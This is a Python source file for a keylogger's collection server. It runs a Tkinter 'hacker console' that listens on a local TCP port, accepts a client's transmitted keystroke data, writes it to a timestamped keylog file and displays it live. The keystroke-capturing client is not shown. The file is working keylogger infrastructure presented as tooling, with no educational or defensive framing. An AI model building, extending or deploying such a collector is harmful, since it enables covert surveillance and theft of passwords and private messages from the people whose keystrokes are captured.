import socket
import logging
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext
from tkinter import font
from threading import Thread

# Server Setup
HOST = '127.0.0.1'  # Server IP address
PORT = 65432        # Port to listen on

# Log File Configuration
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"server_keylog_{timestamp}.txt"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
    ]
)

# Initialize the Tkinter window
root = tk.Tk()
root.title("🔒 Keylogger Server - Hacker Console")
root.geometry("800x600")
root.config(bg="black")

# Header Label
header = tk.Label(root, text="🔒 Keylogger Server Console", bg="black", fg="lime", font=("Courier", 16, "bold"))
header.pack(pady=10)

# Connection Status Indicator
status_label = tk.Label(root, text="Status: Waiting for connection...", bg="black", fg="red", font=("Courier", 12, "italic"))
status_label.pack(pady=5)

# Frame for ScrolledText and Clear Button
frame = tk.Frame(root, bg="black")
frame.pack(expand=True, fill='both', padx=10, pady=10)

# Add a ScrolledText widget for displaying messages with a terminal-like look
text_display = scrolledtext.ScrolledText(frame, wrap='word', font=("Courier", 12), bg="black", fg="lime", insertbackground="lime")
text_display.pack(expand=True, fill='both')
text_display.config(state='disabled')  # Make it read-only

# Clear Log Button
def clear_log():
    """Clear the log display."""
    text_display.config(state='normal')
    text_display.delete('1.0', tk.END)  # Clear all text
    text_display.config(state='disabled')

clear_button = tk.Button(root, text="Clear Log", command=clear_log, bg="red", fg="white", font=("Courier", 10, "bold"))
clear_button.pack(pady=5)

def update_text_display(message, color="lime"):
    """Update the text display with new messages."""
    text_display.config(state='normal')  # Allow editing to insert text
    text_display.insert('end', f"{message}\n", 'color')  # Insert message with color tag
    text_display.see('end')  # Auto-scroll to the latest message
    text_display.config(state='disabled')  # Make read-only again
    text_display.tag_configure('color', foreground=color)  # Set the color for the tag

def update_status(message, color="lime"):
    """Update the status label with the specified message and color."""
    status_label.config(text=f"Status: {message}", fg=color)

def start_server():
    """Starts the server to receive messages and display them in the UI."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        update_text_display(f"[INFO] Server listening on {HOST}:{PORT}", "lime")
        
        conn, addr = server_socket.accept()
        update_status(f"Connected by {addr[0]}", color="green")
        update_text_display(f"[CONNECTED] Client connected: {addr}", "green")

        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                # Decode data and log it
                decoded_data = data.decode('utf-8')
                logging.info(decoded_data)
                update_text_display(f"[LOG] {datetime.now().strftime('%H:%M:%S')} - {decoded_data}", "cyan")
            update_status("Connection closed", color="red")
            update_text_display("[DISCONNECTED] Client connection closed", "red")

# Start the server in a separate thread to keep the GUI responsive
server_thread = Thread(target=start_server, daemon=True)
server_thread.start()

# Run the Tkinter main loop
root.mainloop()
